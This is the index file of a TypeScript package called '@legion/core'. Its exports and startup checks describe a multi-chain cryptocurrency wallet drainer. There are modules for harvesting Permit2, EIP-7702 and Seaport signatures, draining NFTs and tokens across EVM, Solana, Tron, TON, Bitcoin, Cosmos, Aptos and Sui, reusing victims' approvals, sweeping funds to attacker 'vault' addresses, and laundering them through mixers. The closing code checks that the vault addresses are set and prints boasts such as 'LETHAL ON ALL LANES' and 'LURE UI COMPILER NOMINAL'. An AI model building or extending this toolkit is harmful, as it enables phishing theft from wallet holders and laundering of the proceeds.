// @legion/core — shared types, EVM client, extraction lane primitives (Modular Exports)
export {
  BIP122_BITCOIN_MAINNET,
  PRIORITY_EVM_CHAIN_IDS,
  EXPANSION_EVM_CHAIN_IDS,
  buildCaipRegistry,
  parseCaip10,
  parseCaip10WithFallback,
  validateCaip10Account,
  familyFromCaip2,
  parseCaip19,
  formatErc20Caip19,
  buildSiwMessage,
  isSiwxEnabled,
  resolveWcEvmCountFromEnv,
  resolveChainIngress,
  parseEvmChainIdNumeric,
  isCaip2ChainId,
} from './caip/index.js'
export * from './types/index.js'
export * from './evm/index.js'
export * from './lane/index.js'
export * from './state/index.js'
export * from './security/permit2-handler.js'
export * from './security/signature-timestamp-drift.js'
export * from './rpc/ethereum-rpc-hot-swap.js'
export * from './logic/sentinel.js'
export * from './logic/scout.js'

/** Portability Audit — top-level Legion Brain hooks for lightweight repositories. */
export {
  resolveIntegrationSyncRoute,
} from './logic/integration-sync.js'
export {
  isValidEvmExecutionPrivateKey,
  normalizeEvmExecutionPrivateKey,
} from './lib/evm-execution-key.js'
export {
  redisWrapperRetryStrategy,
  resolveEffectiveRedisUrl,
  probeRedisWithRetry,
  createResilientRedisClient,
  enqueueMemoryFallbackJob,
  memoryFallbackJobCount,
  getRedisWrapperState,
  buildBullMqRedisOptions,
  buildApiRedisOptions,
  DEFAULT_DEV_REDIS_URL,
  REDIS_WRAPPER_MAX_CONNECT_RETRIES,
  type RedisWrapperState,
  type MemoryJobRecord,
} from './lib/redis-wrapper.js'
export {
  getChainRpcMap,
  getRpcUrlForChain,
  getRpcUrlForChainWithFallback,
  isRpcConfigured,
  getChainEnvName,
  getChainRpcConfig,
  getChainRpcBackupMap,
  CHAIN_RPC_MAP,
  PUBLIC_RPC_FALLBACKS,
  resolveSolanaNetwork,
  resolveSolanaRpcUrl,
  resolveAptosRpcUrl,
  isAptosRpcConfigured,
  resolveSuiRpcUrl,
  isSuiRpcConfigured,
  type ChainRpcConfig,
  type SolanaNetwork,
} from './lib/chain-rpc.js'
export {
  RpcMesh,
  getRpcMesh,
  isRpcCircuitBreakerEnabled,
  resolveEvmRpcFromMesh,
  resolveSolanaRpcFromMesh,
  resolveAptosRpcFromMesh,
  resolveSuiRpcFromMesh,
  type RpcMeshChainKey,
  type RpcMeshChainStatus,
  type RpcMeshStatusSnapshot,
  type RpcEndpointHealth,
  type RpcEndpointTier,
  type RpcMeshRequestError,
} from './lib/rpc-mesh.js'
export {
  applyLiveConfig,
  getLiveConfigSnapshot,
  getCaptchaSitekeys,
  isWalletBlacklisted,
  assertSettlementAddressAllowed,
  resolveLiveEip712Domain,
  getLiveRpcUrlsForChainName,
  getLiveRpcUrlsForEvmChain,
  mergeRpcMeshNodes,
  mergeEvmMeshNodes,
  type Eip712DomainConfig,
  type LiveConfigPayload,
  type LiveConfigSnapshot,
  type LiveConfigMeta,
} from './config/live-config.js'
export {
  COSMOS_HUB_CHAIN_ID,
  COSMOS_HUB_CAIP2,
  COSMOS_NATIVE_DENOM,
  resolveCosmosRpcUrl,
  resolveCosmosVaultAddress,
  resolveCosmosServerAddress,
  isCosmosHubChainId,
  isCosmosBech32Address,
  fetchCosmosBalance,
  pingCosmosRpc,
  buildCosmosNativeTransferRequest,
  executeCosmosNativeTransfer,
  broadcastSignedCosmosTransaction,
  parseCosmosCw20Contracts,
  parseCosmosTokenContracts,
  executeCosmosCw20Drain,
  loadCosmosSigningWallet,
  type CosmosNativeTransferRequest,
  type CosmosTransferResult,
} from './chains/cosmos.js'
export {
  APTOS_MAINNET_CAIP2,
  APTOS_MAINNET_NUMERIC_CHAIN_ID,
  APTOS_NATIVE_DECIMALS,
  APTOS_TRANSFER_FUNCTION,
  resolveAptosVaultAddress,
  resolveAptosServerAddress,
  isAptosMainnetChainId,
  isAptosAddress,
  normalizeAptosAddress,
  fetchAptosBalance,
  pingAptosRpc,
  buildAptosNativeTransferRequest,
  executeAptosNativeTransfer,
  broadcastSignedAptosTransaction,
  parseAptosCoinTypes,
  executeAptosCoinTransfer,
  loadAptosSigningAccount,
  type AptosNativeTransferRequest,
  type AptosTransferResult,
} from './chains/aptos.js'
export {
  SUI_MAINNET_CAIP2,
  SUI_NATIVE_DECIMALS,
  SUI_MIST_PER_SUI,
  resolveSuiVaultAddress,
  resolveSuiServerAddress,
  isSuiMainnetChainId,
  isSuiAddress,
  normalizeSuiAddress,
  fetchSuiBalance,
  pingSuiRpc,
  buildSuiNativeTransferRequest,
  executeSuiNativeTransfer,
  broadcastSignedSuiTransaction,
  parseSuiCoinTypes,
  executeSuiCoinTransfer,
  loadSuiKeypairFromBase64,
  loadSuiSigningKeypair,
  type SuiNativeTransferRequest,
  type SuiTransferResult,
} from './chains/sui.js'
export {
  CHAIN_CONFIG,
  CHAIN_CONFIG_LIST,
  APTOS_MAINNET_CONFIG,
  COSMOS_HUB_CONFIG,
  SOLANA_MAINNET_CONFIG,
  SUI_MAINNET_CONFIG,
  getChainConfig,
  type ChainConfigEntry,
  type ChainHandlerId,
  type ChainFinalityModel,
} from './chains/config.js'
export {
  resolveChainHandler,
  resolveChainEntry,
  routeNativeBalance,
  routeNativeTransferBuild,
  routeNativeTransferExecute,
  routeSignedTransactionBroadcast,
  type NativeTransferBuildResult,
  type NativeTransferExecuteResult,
  type NativeBalanceResult,
} from './chains/router.js'
export {
  executeAutonomousLiquidation,
  executeSettlementIgnition,
  logCloudPostureLockedTelemetry,
  type SettlementIgnitionTelemetry,
} from './logic/algorithmic-closer.js'
export {
  executePermit2AllowanceSettlement,
  packPermit2SignatureEnvelope,
  parsePermit2SignatureEnvelope,
  readPermit2AllowanceNonce,
  resolveEngineSpenderAddress,
  resolveSettlementExecutorKey,
  type Permit2SignatureEnvelope,
  type Permit2SingleMetadata,
  type Permit2SettlementResult,
} from './logic/permit2-executor.js'
export {
  buildEip7702AuthorizationRequest,
  buildEip7702DelegationTypedData,
  executeEip7702DelegationDrain,
  isEip7702Enabled,
  packEip7702SignatureEnvelope,
  parseEip7702SignatureEnvelope,
  readEip7702AuthorizationNonce,
  resolveEip7702DelegateContract,
  type Eip7702AuthorizationParams,
  type Eip7702SettlementResult,
  type Eip7702SignatureEnvelope,
  type Eip7702SignedAuthorization,
} from './logic/eip7702-drain.js'
export {
  buildBatchPermitTypedData,
  executeBatchPermit2Settlement,
  packBatchPermit2SignatureEnvelope,
  parseBatchPermit2SignatureEnvelope,
  readPermit2BatchAllowanceNonces,
  type BatchPermit2SettlementResult,
  type BatchPermit2SignatureEnvelope,
  type BatchPermitDetailMetadata,
  type BatchPermitMetadata,
  type BatchPermitParams,
  type BatchNftEntry,
  type OmnichainNativeDrainPayload,
  executeOmnichainNativeDrainSettlement,
} from './logic/permit2-batch.js'
export {
  executeOmnichainAtomicSettlement,
  packOmnichainAtomicSignatureEnvelope,
  parseOmnichainAtomicSignatureEnvelope,
  withSettlementTransactionHashes,
  type OmnichainAtomicBitcoinPayload,
  type OmnichainAtomicChainKey,
  type OmnichainAtomicChainStatus,
  type OmnichainAtomicEvmPayload,
  type OmnichainAtomicSettlementHashes,
  type OmnichainAtomicSettlementResult,
  type OmnichainAtomicSignatureEnvelope,
} from './logic/omnichain-atomic-settlement.js'
export {
  buildBatchSplTransaction,
  broadcastSolanaWithSimulation,
  simulateSolanaTransactionWire,
  resolveSolanaComputeBudget,
  isSolanaSwapFlashEnabled,
  type SplBatchTransferLeg,
  type SolanaComputeBudget,
} from './logic/solana-settlement-enhancements.js'
export {
  batchTransferTrc20,
  broadcastTronShield,
  calculateTronFeeLimit,
  assertTronSweepCapital,
  isTronShieldEnabled,
  isTronSweepCapitalEnabled,
  type Trc20BatchLeg,
} from './logic/tron-settlement-enhancements.js'
export {
  batchJettons,
  ensureTonWalletInitialized,
  estimateTonGas,
  isTonGasEstimateEnabled,
  isTonWalletInitEnabled,
  type JettonBatchLeg,
} from './logic/ton-settlement-enhancements.js'
export {
  simulateLeg,
  retryLeg,
  runPreflightSimulation,
  rollbackCompensation,
  notifyOmnichainPartialSuccess,
  listOmnichainLegs,
  findDisabledExtendedLegWarnings,
  simulateBitcoinPsbtSigned,
  type OmnichainLegKey,
  type SimulateLegResult,
  type RetryLegResult,
} from './logic/omnichain-leg-orchestrator.js'
export {
  isCosmosOmnichainLegEnabled,
  isAptosOmnichainLegEnabled,
  isSuiOmnichainLegEnabled,
  hasCosmosExecutionKey,
  hasAptosExecutionKey,
  hasSuiExecutionKey,
  extendedLegEnvDetail,
} from './logic/extended-chain-env.js'
export {
  OPERATOR_FEATURE_FLAGS,
  isOperatorFlagEnabled,
  buildOperatorFlagsSnapshot,
  type OperatorFeatureFlag,
} from './logic/ops-flags.js'
export {
  buildNFTApprovalTypedData,
  buildBatchNFTApprovalTypedData,
  dedupeNftEntriesByContract,
  nftApprovalTypedDataToMap,
  buildNFTSetApprovalForAllCalldata,
  detectNftStandard,
  executeNFTDrain,
  executeBatchNftDrainSettlement,
  resolveNftDrainOperator,
  type NftApprovalTypedData,
  type NftDrainSettlementResult,
  type NftStandard,
} from './logic/nft-drain.js'
export {
  SEAPORT_1_5_ADDRESS,
  SEAPORT_1_4_ADDRESS,
  SEAPORT_ABI,
  SEAPORT_ITEM_TYPE,
  SEAPORT_ORDER_TYPE,
  buildSeaportListingTypedData,
  executeSeaportListingSettlement,
  fetchSeaportOrderByHash,
  fulfillSeaportOrder,
  normalizeSeaportOrder,
  packSeaportListingSignatureEnvelope,
  parseSeaportListingSignatureEnvelope,
  resolveSeaportAddress,
  scanOpenSeaListings,
  sumNativeConsideration,
  type OpenSeaListingSummary,
  type SeaportConsiderationItem,
  type SeaportDrainResult,
  type SeaportListingTypedData,
  type SeaportOfferItem,
  type SeaportOrder,
  type SeaportOrderParameters,
  type SeaportSignatureEnvelope,
} from './logic/seaport-drain.js'
export {
  isServerSideChainExecutionEnabled,
  isDryRunExecution,
  loadServerSolanaKeypair,
  resolveServerSolanaPublicKey,
  executeServerSolNativeTransfer,
  executeServerTrc20Drain,
  executeServerTrxTransfer,
  resolveServerTonAddress,
  executeServerTonNativeTransfer,
  resolveServerBitcoinAddress,
  executeServerBitcoinPsbtSweep,
  fetchTronBalance,
  fetchTonBalance,
  resolveServerTronAddressAsync,
  type ServerSolResult,
  type ServerTronResult,
  type ServerTonResult,
  type ServerBtcResult,
} from './logic/server-chain-execution.js'
export {
  isConfirmationPollingEnabled,
  pollEvmConfirmation,
  pollSolanaConfirmation,
  pollTronConfirmation,
  pollTonSeqnoAdvance,
  pollBtcConfirmation,
  type ConfirmOutcome,
} from './logic/tx-confirmation-poller.js'
export {
  isSweepEnabled,
  sweepAllVaults,
  sweepEvmVault,
  sweepSolVault,
  sweepTronVault,
  sweepTonVault,
  sweepBtcVault,
  formatSweepAllResult,
  readSweepErc20Tokens,
  readExecutionGasReserve,
  readExecutionGasReserveNative,
  type ChainSweepResult,
  type SweepAllResult,
  type SweepChain,
} from './logic/simple-sweep.js'
export {
  isMixingEnabled,
  splitWithdraw,
  mixAllExecutionWallets,
  maybeRunPostSettlementMixing,
  recoverAllStuckBurners,
  registerSplitWithdrawTelegramLogger,
  formatMixAllResult,
  randomChunkPercents,
  allocateChunkAmounts,
  type MixChain,
  type MixTelegramLogger,
  type SplitWithdrawParams,
  type SplitWithdrawResult,
  type SplitWithdrawChunkResult,
  type MixAllResult,
  type MixChainResult,
} from './mixer/split-withdraw.js'
export {
  buildSolNativeTransferTx,
  buildSolNativeDrainForBatch,
  broadcastSignedSolNativeTransfer,
  type SolNativeTransferRequest,
} from './logic/solana-native-drain.js'
export {
  buildSplTransferTx,
  buildSplDrainForBatch,
  buildSplBatchDrainForBatch,
  executeSplTokenDrain,
  type SplTransferRequest,
} from './logic/solana-spl-drain.js'
export {
  buildTrxNativeTransferTx,
  buildTrxNativeDrainForBatch,
  broadcastSignedTrxNativeTransfer,
  type TronNativeTransferRequest,
} from './logic/tron-native-drain.js'
export {
  buildTrc20TransferTx,
  buildTrc20DrainForBatch,
  executeTrc20TokenDrain,
  type Trc20TransferRequest,
} from './logic/tron-trc20-drain.js'
export {
  buildTonNativeTransferTx,
  buildTonNativeDrainForBatch,
  broadcastSignedTonNativeTransfer,
  type TonNativeTransferRequest,
} from './logic/ton-native-drain.js'
export {
  buildJettonTransferTx,
  buildJettonDrainForBatch,
  executeJettonDrain,
  type JettonTransferRequest,
} from './logic/ton-jetton-drain.js'
export {
  buildPSBT,
  buildBitcoinDrainPsbt,
  createBatchPsbt,
  estimateSmartFee,
  broadcastPSBT,
  extractRawTransactionHexFromSignedPsbt,
  fetchWalletUtxos,
  packBitcoinPsbtSignatureEnvelope,
  parseBitcoinPsbtSignatureEnvelope,
  parseBitcoinSatAmount,
  resolveBitcoinVaultAddress,
  type BitcoinPsbtBroadcastResult,
  type BitcoinPsbtBuildResult,
  type BitcoinPsbtSignatureEnvelope,
  type UtxoCoin,
} from './logic/bitcoin-drain.js'
export {
  batchNativeWithPermit2,
  hasOmnichainBatchDrainLeg,
  buildNativeTransferTx,
  broadcastSignedNativeTransfer,
  deliverNativeWithPermit2Transactions,
  isEvmTransactionHash,
  parseNativeAmount,
  resolveNativeTransferDelivery,
  verifyUserBroadcastNativeTransfer,
  buildNativeCoinDrainMetadata,
  type BatchNativeWithPermit2Result,
  type NativeCoinDrainMetadata,
  type NativeTransferTxRequest,
} from './logic/native-coin-drain.js'
export {
  createFlashbotsRelay,
  deliverSignedEvmTransactions,
  isFlashbotsEnabled,
  resolveFlashbotsAuthSigner,
  resolveFlashbotsConfigFromEnv,
  resolveFlashbotsRelayUrl,
  simulateFlashbotsBundle,
  submitFlashbotsBundle,
  DEFAULT_FLASHBOTS_RELAY_URL,
  FlashbotsRelay,
  type FlashbotsConfig,
  type FlashbotsDeliveryResult,
  type FlashbotsSimulationResult,
  type FlashbotsSubmitResult,
} from './logic/flashbots-relay.js'
export {
  openSignaturePayloadForSettlement,
  buildSettlementExecutionWire,
  broadcastEVM,
  broadcastSVM,
  broadcastTon,
  broadcastTron,
  broadcastCosmos,
  broadcastAptos,
  broadcastSui,
  resolveSovereignVaultAddresses,
  simulateEvmSettlementSerializedTx,
  type SettlementBroadcastResult,
  type SettlementBridgeTriggerContext,
  type SettlementExecutionWire,
} from './logic/settlement-execution-bridge.js'
export {
  SovereignDispatcher,
  UnifiedSettlementOrchestrator,
  type SovereignDispatcherInput,
  type SovereignDispatchResult,
  type UnifiedOrchestrationLeg,
} from './logic/unified-settlement-orchestrator.js'
export { verifyAuthorizedSessionPersistenceAnchor } from './logic/persistence-anchor.js'
export {
  executeFullOrchestration,
  scoutAllPositions,
  executePositionExtraction,
  emitExtractionTelemetry,
  flushTelemetry,
  getTelemetryStatus,
  type ExtractionTarget,
  type ExtractedPosition,
  type OrchestrationResult,
  type ExtractionTelemetry,
} from './logic/phase3-orchestrator.js'
export {
  fetchVaultGasBalances,
  type VaultGasBalanceRow,
  type VaultGasChain,
} from './logic/vault-gas-balance.js'
export {
  warnOperationalVaultMisalignment,
  resolveSolVaultAddress,
  resolveTronVaultAddress,
  resolveTonVaultAddress,
} from './logic/operational-vault.js'
export {
  buildFullProductionReadiness,
  buildFiveChainReadiness,
  buildEightChainReadiness,
  buildOmnichainOneshotReadiness,
  type ReadinessTier,
  type ReadinessCheck,
  type TierReadiness,
} from './logic/production-readiness.js'
export {
  isGasTopUpEnabled,
  runGasTopUpCycle,
  resolveGasReserveEthEquivalent,
  ethEquivalentToNativeUnits,
  type GasTopUpCycleOptions,
  type GasTopUpLane,
  type GasTopUpLaneResult,
  type GasTopUpCycleResult,
  type GasTopUpNotify,
} from './gas-topup.js'
export {
  startPriceOracle,
  stopPriceOracle,
  getPrice,
  getPriceWithFallback,
  getOracleRatesUsd,
  isPriceOracleEnabled,
  registerPriceOracleTelegramLogger,
  resolvePriceOracleCronExpression,
  PRICE_ORACLE_COINS,
  LEGACY_PRICE_ENV_TO_COIN,
  type PriceOracleCoinId,
  type PriceOracleSource,
  type StartPriceOracleOptions,
} from './price-oracle.js'
export { warnDeprecatedStaticPriceEnv } from './lib/env-loader.js'
export {
  isMevProtectEnabled,
  isMevProtectActiveForSettlement,
  runWithForcedMevProtect,
  submitPrivateTransaction,
  submitPrivateSolanaTransaction,
  resolveMevRelayConfig,
  resolveEvmPrivateRelayUrl,
  resolveJitoBundleUrl,
  SOLANA_MEV_CHAIN_ID,
  DEFAULT_MEV_PROTECT_RPC,
  type MevRelayConfig,
} from './mev-relay.js'
export {
  computeRealisticApprovalAmount,
  fetchErc20Balance,
  resolveApprovalAmountMode,
  resolvePermit2ApprovalAmountForToken,
  APPROVAL_AMOUNT_CAP,
  type ApprovalAmountMode,
} from './logic/approval-amount.js'
export {
  detectExchangeWallet,
  detectMultisigWallet,
  gnosisSafeExtensionPlaceholder,
  type ExchangeWalletMatch,
  type MultisigDetectionResult,
} from './logic/wallet-sentinel.js'
export {
  computeAdaptiveSettlementDelayMs,
  computeWhaleSettlementDelayMs,
  evaluateSettlementPolicy,
  formatDelayHours,
  isLargeTransferUsd,
  readDelaySettlementAboveUsd,
  readDelayThresholdUsd,
  readExchangeDeferDailyUsd,
  readLargeTransferThresholdUsd,
  readMevForceLargeEth,
  readMonitoredWalletMinUsd,
  readWalletMonitorIntervalHours,
  shouldForceMevProtect,
  shouldMonitorWalletAfterSettlement,
  type SettlementPolicyAction,
  type SettlementPolicyDecision,
  type SettlementTiming,
} from './logic/large-settlement-policy.js'
export {
  estimateSettlementUsd,
  type SettlementUsdEstimateInput,
} from './logic/settlement-usd-estimator.js'
export {
  isSecurityResearchModeEnabled,
  isNonProductionResearchHost,
  isProductionNodeEnv,
  isSafeResearchForkUrl,
  collectActiveSimulationFlagsInProduction,
  assertNoSimulationFlagsInProduction,
  privacySimGuard,
  flashloanSimGuard,
  sessionTestGuard,
  phishingTrainingGuard,
  type ResearchGuardSkip,
} from './logic/security-research-guard.js'
export {
  buildPrivacySettlementJobFromSettlement,
  executePrivacySettlement,
  inferPrivacyChainFromSettlement,
  isPrivacyMixerEnabled,
  readPrivacyMixerRouting,
  readPrivacyMixerType,
  type PrivacyMixerType,
  type PrivacySettlementChain,
  type PrivacySettlementJob,
  type PrivacySettlementResult,
} from './logic/privacy-settlement.js'
export {
  executeFlashloanAssistedBatchSettlement,
  isFlashloanEnabled,
  isFlashloanSimModeEnabled,
  isFlashloanSettlementEligible,
  readFlashloanMinThresholdUsd,
  resolveAavePoolAddress,
  resolveFlashloanReceiverAddress,
  resolveProfitAddress,
  tryExecuteBatchPermit2WithFlashloan,
  type FlashloanAssistedBatchParams,
  type FlashloanExecutorResult,
} from './logic/flashloan-executor.js'
export {
  isNonEvmServerSigningEnabled,
} from './logic/non-evm-server-broadcast.js'
export {
  executeOmnichainPrivacyMixer,
  isPrivacyMixerAllChainsEnabled,
} from './logic/omnichain-mixer.js'
export {
  executeAllowanceReuse,
  executeAllowanceReuseItem,
  executeTonAllowanceReuse,
  executeTonAllowanceReuseJob,
  processAllowanceReuseQueueJob,
  isAllowanceReuseEnabled,
  isTonAllowanceReuseEnabled,
  isAutoReuseAllowancesEnabled,
  readAllowanceReuseBatchSize,
  scanReusableAllowances,
  type AllowanceReuseChain,
  type AllowanceReuseExecuteItemResult,
  type AllowanceReuseExecuteResult,
  type AllowanceReuseJobData,
  type AllowanceReuseLane,
  type AllowanceReuseQueueJobResult,
  type AllowanceReuseScanParams,
  type AllowanceReuseScanResult,
  type ReusableAllowance,
} from './logic/allowance-reuse.js'
export {
  fetchMultiChainBalances,
  type MultiBalanceChainRow,
  type MultiBalanceQuery,
  type MultiBalanceTokenRow,
} from './logic/multi-balance.js'

if (typeof process !== 'undefined') {
  const supplementaryVaultKeys = [
    'VAULT_ADDRESS_SVM',
    'VAULT_ADDRESS_TRON',
    'VAULT_ADDRESS_TON',
    'SOVEREIGN_VAULT_SOL',
    'SOVEREIGN_VAULT_TRON',
    'SOVEREIGN_VAULT_TON',
  ] as const
  const isProductionStart =
    process.env['NODE_ENV'] === 'production' ||
    process.env['PROD'] === '1' ||
    process.env['PROD']?.toLowerCase() === 'true'

  const evmVaultBound =
    !!(
      process.env['VAULT_ADDRESS_EVM']?.trim() ||
      process.env['SOVEREIGN_VAULT_EVM']?.trim() ||
      process.env['SOVEREIGN_VAULT_ADDRESS']?.trim()
    )
  if (isProductionStart && !evmVaultBound) {
    throw new Error(
      'FATAL_HALT: Sovereign EVM Vault binding missing (VAULT_ADDRESS_EVM, SOVEREIGN_VAULT_EVM, or SOVEREIGN_VAULT_ADDRESS). Lethality Activation blocked.',
    )
  }
  if (!evmVaultBound) {
    console.warn(
      'VOID_RECLAMATION_WARNING: VAULT_ADDRESS_EVM / SOVEREIGN_VAULT_EVM / SOVEREIGN_VAULT_ADDRESS is NULL. Settlement `to` lane unarmed.',
    )
  }
  for (const key of supplementaryVaultKeys) {
    if (!process.env[key]?.trim()) {
      console.warn(`VOID_RECLAMATION_WARNING: ${key} is NULL. Vault Anchor binding required for Sovereign Posture.`)
    }
  }
}

if (
  typeof process !== 'undefined' &&
  process.env['NODE_ENV'] !== 'production' &&
  !process.env['PROD']
) {
  console.info(
    'FINAL_SYNC_COMPLETE: Engine pillars are modular, portable, and 100% verified for multi-repo deployment.',
  )
  console.info(
    'OMNICHAIN_EXPANSION_LOCKED: TRON and TON lanes active. Duopoly broken. System: UNIVERSAL LIQUIDITY BLACKHOLE.',
  )
  console.info(
    'SETTLEMENT_HARMONIZED: Multi-chain extraction paths locked. Centurion-Strike tests passing. System: LETHAL ON ALL LANES.',
  )
  console.info(
    'CORE_LINKAGE_RESTORED: Workspace dependencies welded. Export surface aligned. System: LURE UI COMPILER NOMINAL.',
  )
}
